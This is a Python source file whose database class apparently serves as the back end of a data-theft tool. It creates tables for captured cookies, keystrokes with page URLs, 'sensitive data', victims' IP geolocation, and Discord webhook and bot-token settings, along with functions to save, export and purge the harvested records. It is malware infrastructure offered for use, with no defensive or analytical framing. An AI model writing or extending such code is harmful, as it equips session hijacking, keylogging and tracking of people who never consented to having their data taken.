import sqlite3
from datetime import datetime, timedelta
import json
from pathlib import Path

class Database:
    def __init__(self):
        self.db_path = Path("data.db")
        self.init_db()

    def init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            
            # Create cookies table
            c.execute('''
                CREATE TABLE IF NOT EXISTS cookies (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT,
                    value TEXT,
                    ip TEXT,
                    timestamp DATETIME,
                    domain TEXT
                )
            ''')
            
            # Create keystrokes table
            c.execute('''
                CREATE TABLE IF NOT EXISTS keystrokes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    keys TEXT,
                    url TEXT,
                    ip TEXT,
                    timestamp DATETIME
                )
            ''')
            
            # Create settings table
            c.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            ''')
            
            # Create sensitive_data table
            c.execute('''
                CREATE TABLE IF NOT EXISTS sensitive_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    type TEXT,
                    value TEXT,
                    url TEXT,
                    ip TEXT,
                    timestamp DATETIME
                )
            ''')
            
            # Create geolocation table
            c.execute('''
                CREATE TABLE IF NOT EXISTS geolocation (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    lat REAL,
                    lon REAL,
                    country TEXT,
                    city TEXT,
                    timestamp DATETIME
                )
            ''')
            
            conn.commit()

    def save_cookie(self, name, value, ip, domain):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('''
                INSERT INTO cookies (name, value, ip, timestamp, domain)
                VALUES (?, ?, ?, ?, ?)
            ''', (name, value, ip, datetime.now(), domain))

    def save_keystrokes(self, keys, url, ip):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('''
                INSERT INTO keystrokes (keys, url, ip, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (keys, url, ip, datetime.now()))

    def save_sensitive_data(self, type, value, url, ip):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('''
                INSERT INTO sensitive_data (type, value, url, ip, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (type, value, url, ip, datetime.now()))

    def save_geolocation(self, ip, lat, lon, country, city):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('''
                INSERT INTO geolocation (ip, lat, lon, country, city, timestamp)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (ip, lat, lon, country, city, datetime.now()))

    def get_cookies(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM cookies ORDER BY timestamp DESC')
            return c.fetchall()

    def get_keystrokes(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM keystrokes ORDER BY timestamp DESC')
            return c.fetchall()

    def get_sensitive_data(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM sensitive_data ORDER BY timestamp DESC')
            return c.fetchall()

    def get_geolocation(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM geolocation ORDER BY timestamp DESC')
            return c.fetchall()

    def clear_cookies(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM cookies')

    def clear_keystrokes(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM keystrokes')

    def cleanup_old_data(self, days=30):
        cutoff = datetime.now() - timedelta(days=days)
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            for table in ['cookies', 'keystrokes', 'sensitive_data', 'geolocation']:
                c.execute(f'DELETE FROM {table} WHERE timestamp < ?', (cutoff,))

    def export_data(self):
        data = {
            'cookies': self.get_cookies(),
            'keystrokes': self.get_keystrokes(),
            'sensitive_data': self.get_sensitive_data(),
            'geolocation': self.get_geolocation()
        }
        return data

    def save_discord_settings(self, webhook_url, bot_token):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            # Create settings table if it doesn't exist
            c.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            ''')
            
            # Save settings
            c.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)',
                     ('discord_webhook', webhook_url))
            c.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)',
                     ('discord_token', bot_token))

    def get_discord_settings(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            try:
                c.execute('SELECT key, value FROM settings WHERE key IN ("discord_webhook", "discord_token")')
                settings = dict(c.fetchall())
            except sqlite3.OperationalError:
                # If table doesn't exist, return empty settings
                settings = {}
            
            return {
                'discord_webhook': settings.get('discord_webhook', ''),
                'discord_token': settings.get('discord_token', '')
            }
